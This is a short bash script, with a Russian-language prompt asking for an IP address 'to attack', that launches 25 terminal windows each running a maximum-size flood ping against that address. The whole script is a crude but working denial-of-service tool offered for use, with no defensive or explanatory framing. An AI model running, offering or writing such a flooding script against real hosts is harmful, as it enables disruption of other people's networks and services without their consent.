#!/bin/bash
read -p "Введите ip для атаки: " ip
for i in {1..25}; do
    gnome-terminal -- bash -c "sudo ping -f -s 65507 $ip" &
done